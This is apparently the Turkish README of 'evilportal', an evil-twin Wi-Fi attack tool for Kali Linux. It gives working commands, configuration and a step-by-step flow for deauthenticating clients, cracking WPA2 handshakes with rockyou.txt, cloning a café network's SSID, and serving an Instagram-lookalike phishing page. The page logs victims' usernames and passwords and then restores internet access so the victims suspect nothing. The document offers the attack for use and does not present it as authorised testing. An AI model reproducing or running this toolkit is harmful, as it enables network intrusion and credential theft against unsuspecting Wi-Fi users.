# evilportal

Kali Linux üzerinde çalışan evil-twin + captive-portal sistemi:

**deauth → aynı SSID'li sahte AP → wildcard DNS → sahte doğrulama sayfası → credential capture → MAC whitelist ile gerçek internet**

---

## Gereksinimler

| Bileşen | Not |
|---|---|
| Kali Linux | root |
| Monitor mode destekli adaptör | deauth için |
| İkinci adaptör | AP için (önerilen) |
| `hostapd`, `dnsmasq` | `apt install hostapd dnsmasq` |
| `aircrack-ng` | `apt install aircrack-ng` |
| `ipset`, `iptables` | genelde kurulu |
| `flask` | `sudo apt install python3-flask` (veya `pip3 install flask --break-system-packages`) |
| `hashcat` + `hcxtools` | opsiyonel — varsa kırma hızlanır |

---

## Hızlı başlangıç

### A) GUI ile (önerilen)

```bash
cd evilportal
chmod +x setup.sh deauth.sh scan.sh autopwn.sh
sudo python3 gui.py
```

Tarayıcıda `http://127.0.0.1:8099` aç:

1. **Arayüz** — monitor kartı, AP kartı, uplink
2. **Hedef** — “Tara” ile ağları listele, seç; SSID/BSSID/kanal otomatik dolar
3. **Kır** — WPA2 ise handshake yakala + wordlist ile kır, PSK otomatik dolar
4. **Başlat** — canlı log, başlat/durdur
5. **Kayıtlar** — yakalanan bilgiler, otomatik yenilenir

“Portalı önizle” butonu seçili sahte sayfayı yeni sekmede gösterir.

GUI yalnızca `127.0.0.1`'i dinler. Kali'yi uzaktan yönetiyorsan SSH tüneli aç:

```bash
# kendi makinende
ssh -L 8099:127.0.0.1:8099 kali@hedef-ip
# sonra tarayıcıda
http://127.0.0.1:8099
```

### B) Terminal ile

```bash
cd evilportal
chmod +x setup.sh deauth.sh scan.sh autopwn.sh

# 1) Hedefi bul
sudo ./scan.sh wlan0
#    Çıktıdaki BSSID / CH / ESSID değerlerini not al

# 1b) WPA2 ise handshake yakala ve kır (PSK'yi capture/psk.txt'e yazar)
sudo ./autopwn.sh AA:BB:CC:DD:EE:FF 6 KafeWiFi
#    çıkan PSK'yi config.sh'de WPA_PASS'e yaz

# 2) config.sh'i düzenle
nano config.sh
#    TARGET_SSID, TARGET_BSSID, CHANNEL, WPA_PASS, MON_IF, AP_IF

# 3) Çalıştır
sudo ./setup.sh

# 4) Yakalananları izle (ayrı terminal)
python3 show.py -f

# 5) Durdur
Ctrl+C
```

`setup.sh` çıkışta otomatik temizlik yapar: iptables, ipset, hostapd, dnsmasq kapatılır, NetworkManager geri açılır.

---

## Ayar dosyası

```bash
# --- Arayüzler ---
MON_IF="wlan0"        # monitor (deauth)
AP_IF="wlan1"         # sahte AP
UPLINK_IF=""          # boş = otomatik bul
SINGLE_ADAPTER=0      # 1 = tek adaptör

# --- Hedef ---
TARGET_SSID="KafeWiFi"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=6
WPA_PASS=""           # hedef WPA2 ise parolası

# --- Ağ ---
GATEWAY_IP="10.0.0.1"
PORTAL_PORT=80
SHARE_INTERNET=1

# --- İçerik ---
PORTAL_TEMPLATE="instagram"   # instagram | verify
BRAND="Hesap Güvenliği Merkezi"
SUCCESS_URL="https://www.google.com"

# --- Handshake kırma ---
WORDLIST="/usr/share/wordlists/rockyou.txt"
CAPTURE_TIMEOUT="60"
```

---

## Kritik nokta: hedefin güvenlik tipi

Bu, sistemin çalışıp çalışmayacağını belirleyen tek şey:

| Hedef ağ | Yöntem | Sonuç |
|---|---|---|
| **Açık (open)** | `WPA_PASS` boş | İstemciler otomatik bağlanır ✅ |
| **WPA2-PSK, parola biliniyor** | `WPA_PASS` dolu | İstemciler otomatik bağlanır ✅ |
| **WPA2-PSK, parola bilinmiyor** | 3. adım: handshake kır | Wordlist bulursa ✅, bulamazsa ❌ |
| **WPA3 / 802.1X** | — | Deauth PMF ile engellenir ❌ |

Kritik nokta: WPA2 hedefte sahte AP'nin istemcileri **otomatik** çekmesi için gerçek
PSK'yi bilmek zorundasın. İstemci kayıtlı profiliyle 4-way handshake bekler; sen PSK'ya
sahip değilsen handshake tamamlanmaz ve cihaz bağlanmaz. Bu yüzden `autopwn.sh` var:
handshake'i yakalar, wordlist ile kırar, çıkan parolayı sahte AP'ye yazar.

---

## Handshake kırma — `autopwn.sh`

Fluxion tarzı akışın otomatik hali:

```
monitor mode + kanal kilidi
        ↓
airodump-ng (hedef BSSID, pcap)  +  aireplay-ng deauth döngüsü
        ↓
4-way handshake yakalanana kadar bekle (CAPTURE_TIMEOUT)
        ↓
hashcat -m 22000 (hcxtools varsa)  →  yoksa  aircrack-ng
        ↓
PSK bulundu → capture/psk.txt → GUI'de WPA_PASS alanına yazılır
        ↓
4. adımda sahte AP bu PSK ile açılır → istemciler otomatik bağlanır
        ↓
captive portal → Instagram sayfası
```

Terminalden:

```bash
sudo ./autopwn.sh
# veya
sudo ./autopwn.sh AA:BB:CC:DD:EE:FF 6 KafeWiFi \
     /usr/share/wordlists/rockyou.txt wlan0 90
```

Sınırlar:

- **Wordlist'e bağlı.** rockyou.txt zayıf/standart parolaları kırar; güçlü PSK kırılmaz.
- Kali'de rockyou sıkıştırılmış gelir: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
- aircrack-ng CPU'da yavaştır (birkaç bin anahtar/sn). rockyou tam tarama saatler
  sürebilir — önce küçük/özel liste dene, GPU varsa hashcat kullan.
- **Handshake için hedefe bağlı aktif bir istemci gerekir.** Kimse bağlı değilse
  deauth handshake üretmez.
- WPA3-SAE kırılamaz; 802.11w PMF deauth'u engeller ama pasif handshake yakalanabilir.

---

## Akış

```
1. airmon-ng check kill          → NetworkManager susturulur
2. wlan0 → monitor, kanal kilit  → deauth hazır
3. wlan1 → 10.0.0.1, hostapd     → sahte AP yayında (aynı SSID)
4. dnsmasq                       → DHCP + tüm alan adları 10.0.0.1
5. iptables DNAT :80 → portal    → HTTP portalda biter
6. aireplay-ng --deauth döngüsü  → istemciler gerçek AP'den düşer
7. İstemci twin'e bağlanır       → OS probe → portal açılır
8. Form POST → capture/creds.log → ipset'e MAC eklenir → internet açılır
```

---

## Neden iki adaptör?

Tek radyo aynı anda hem deauth atıp hem AP yayınlayamaz. Gerçek AP hâlâ yayında olduğu için istemciler sürekli gerçek AP'ye dönmeye çalışır; deauth döngüsü bu yüzden şart. Deauth için bir adaptör, AP için başka bir adaptör gerekir.

`SINGLE_ADAPTER=1` ile sanal `evilmon` vif oluşturulur. Bazı yongalar (ath9k, mt76) bunu kaldırır, bazıları kaldırmaz. Kaldırıyorsa deauth verimi düşer.

---

## Portal davranışı

Her HTTP isteği portala düşer çünkü dnsmasq tüm alan adlarını `10.0.0.1`'e çözer. OS probe endpoint'leri (`/generate_204`, `/hotspot-detect.html`, `/connecttest.txt` …) 302 döner → işletim sistemi captive portal algılar ve kendi mini tarayıcısını açar.

HTTPS (443) doğrulanmamış istemciler için `tcp-reset` ile reddedilir. Bu yüzden kullanıcı portal dışına çıkamaz; tüm gezinme portalda kalır.

Form gönderildiğinde:

```json
{"ts":"2026-11-20 14:03:11","ip":"10.0.0.42","mac":"aa:bb:cc:dd:ee:ff",
 "username":"kisi@mail.com","password":"...","ua":"Mozilla/5.0 ..."}
```

satırı `capture/creds.log`'a yazılır, MAC `ipset portal_auth`'a eklenir, `thanks.html` gösterilir ve 2 saniye sonra `SUCCESS_URL`'e yönlendirilir. Bu noktadan sonra istemcinin interneti gerçekten açılır — kurban "doğruladım, düzeldi" hisseder.

---

## Sayfayı özelleştirme

`PORTAL_TEMPLATE` ile portal sayfası seçilir:

| Değer | Sayfa |
|---|---|
| `instagram` | Instagram görünümlü “şüpheli aktivite, 24 saat içinde kapatılacak” |
| `verify` | Genel “hesap doğrulama” sayfası |

`portal/templates/instagram.html` — logo, başlık, uyarı metni, form alanları.
`portal/templates/verify.html` — genel varyant.
`portal/templates/thanks.html` — doğrulama sonrası ekran.
`config.sh` içindeki `SUCCESS_URL` — iki template'te de kullanılır.

Form alanlarını değiştirirsen `portal/app.py` içindeki `request.form.get(...)`
anahtarlarını da güncelle.

---

## Kayıtları okuma

```bash
python3 show.py          # bir kere
python3 show.py -f       # canlı takip
```

---

## Sorun giderme

| Belirti | Sebep / çözüm |
|---|---|
| `hostapd başlatılamadı` | Adaptör AP mode desteklemiyor veya `AP_IF` yanlış. `logs/hostapd.log` |
| Portal açılmıyor | `dnsmasq` çalışıyor mu, `iptables -t nat -L -n -v` |
| İstemci bağlanmıyor | Hedef WPA2 ve `WPA_PASS` boş — yukarıdaki tablo |
| Handshake yakalanmıyor | Hedefe bağlı istemci yok, kanal yanlış, ya da PMF aktif |
| PSK bulunamadı | Wordlist yetersiz; daha büyük liste veya hashcat+GPU |
| Wordlist okunamıyor | `gunzip /usr/share/wordlists/rockyou.txt.gz` |
| Deauth işe yaramıyor | 802.11w (PMF) aktif, ya da yanlış kanal/BSSID |
| Tek adaptörde AP düşüyor | Yongaset uyumsuz — ikinci adaptör kullan |
| İnternet gelmiyor | `UPLINK_IF` yanlış veya `ip_forward` kapalı |
| `ipset` bulunamadı | `apt install ipset` |

---

## Dosya yapısı

```
evilportal/
├── config.sh                 # tüm ayarlar
├── setup.sh                  # ana orkestrasyon
├── gui.py                    # adım adım yerel web GUI (127.0.0.1:8099)
├── autopwn.sh                # handshake yakala + kır (PSK)
├── deauth.sh                 # sürekli deauth döngüsü
├── scan.sh                   # hedef keşfi
├── show.py                   # yakalananları göster
├── portal/
│   ├── app.py                # Flask portal + capture + ipset
│   └── templates/
│       ├── instagram.html    # Instagram — şüpheli aktivite
│       ├── verify.html       # genel doğrulama
│       └── thanks.html       # doğrulama sonrası
├── capture/creds.log         # yakalananlar (runtime)
├── logs/                     # hostapd/dnsmasq/portal logları (runtime)
└── run/                      # geçici config + pid dosyaları (runtime)
```

---

## Sınırlar

- **WPA3 / 802.1X** hedeflerde deauth çalışmaz (PMF), twin bağlanmaz.
- **HTTPS içeriği** deşifre edilmez — portal sadece HTTP üzerinde çalışır, form verisi düz metin gider çünkü sayfa senin sunucundan geliyor.
- **iOS/macOS** captive portal WebView'i (.mobileconfig kurulumu) engeller; bu sistem sertifika yükletmez, kimlik avına dayanır.
- Kurban "Use without internet" / "Bağlantıyı kes" derse portal atlanır.
